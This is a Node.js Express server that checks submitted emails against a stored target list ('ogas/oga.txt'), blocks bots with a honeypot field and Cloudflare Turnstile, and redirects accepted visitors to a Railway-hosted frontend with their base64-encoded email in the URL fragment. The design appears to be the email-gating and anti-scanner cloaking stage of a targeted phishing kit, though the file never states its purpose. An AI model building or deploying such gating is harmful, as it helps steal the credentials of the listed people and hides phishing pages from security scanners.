require('dotenv').config();

const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const fetch = require('node-fetch');
const rateLimit = require('express-rate-limit');
const crypto = require('crypto');
const helmet = require('helmet');

const app = express();
const PORT = process.env.PORT || 3000;
const EMAIL_FILE = path.join(__dirname, 'ogas', 'oga.txt');
const REDIRECT_BASE = process.env.REDIRECT_BASE || 'https://frontend-production-05bd.up.railway.app';

let validEmails = new Set();
let tokenMap = new Map();

function loadEmails() {
  try {
    const data = fs.readFileSync(EMAIL_FILE, 'utf8');
    validEmails = new Set(data.split('\n').map(e => e.trim().toLowerCase()));
    console.log('[INFO] Email list loaded into memory');
  } catch (err) {
    console.error('[ERROR] Failed to read email list:', err);
  }
}
loadEmails();

const limiter = rateLimit({
  windowMs: 60 * 1000,
  max: 50,
  message: { valid: false, message: 'Too many requests, try again later.' },
});

// Middleware
app.use(helmet());
app.use((req, res, next) => {
  if (req.headers['x-forwarded-proto'] !== 'https') {
    return res.redirect(`https://${req.headers.host}${req.url}`);
  }
  next();
});
app.use(cors({
  origin: 'https://frontend-production-05bd.up.railway.app'
}));
app.use(express.json());
app.use(limiter);

// API to check email and generate redirect token
app.post('/api/check-email', async (req, res) => {
  const { email, captchaToken, middleName } = req.body;

  if (middleName && middleName.trim() !== '') {
    return res.status(403).json({ valid: false, message: 'Bot activity detected' });
  }

  if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
    return res.status(400).json({ valid: false, message: 'Invalid email format' });
  }

  if (!captchaToken) {
    return res.status(400).json({ valid: false, message: 'Captcha missing' });
  }

  try {
    const verifyRes = await fetch('https://challenges.cloudflare.com/turnstile/v0/siteverify', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: `secret=${process.env.CLOUDFLARE_SECRET}&response=${captchaToken}`,
    });

    const verifyData = await verifyRes.json();
    if (!verifyData.success) {
      return res.status(400).json({ valid: false, message: 'CAPTCHA failed. Reload page' });
    }
  } catch (err) {
    return res.status(500).json({ valid: false, message: 'Captcha verification error' });
  }

  const normalizedEmail = email.toLowerCase();
  if (!validEmails.has(normalizedEmail)) {
    return res.status(404).json({ valid: false, message: 'Email not recognized' });
  }

  const token = crypto.randomBytes(16).toString('hex');
  const encoded = Buffer.from(normalizedEmail).toString('base64');
  tokenMap.set(token, { email: encoded, expires: Date.now() + 5 * 60 * 1000 }); // 5 min expiry

  const redirectUrl = `${REDIRECT_BASE}/forward?token=${token}`;
  return res.json({ valid: true, redirectUrl });
});

// Redirect handler using temporary token
app.get('/forward', (req, res) => {
  const { token } = req.query;
  const entry = tokenMap.get(token);

  if (!entry) {
    return res.status(403).send('Invalid or expired token.');
  }

  if (Date.now() > entry.expires) {
    tokenMap.delete(token);
    return res.status(410).send('Token expired.');
  }

  const redirectUrl = `${REDIRECT_BASE}/#${entry.email}`;
  tokenMap.delete(token);
  res.redirect(302, redirectUrl);
});

app.listen(PORT, () => {
  console.log(`Backend running on http://localhost:${PORT}`);
});
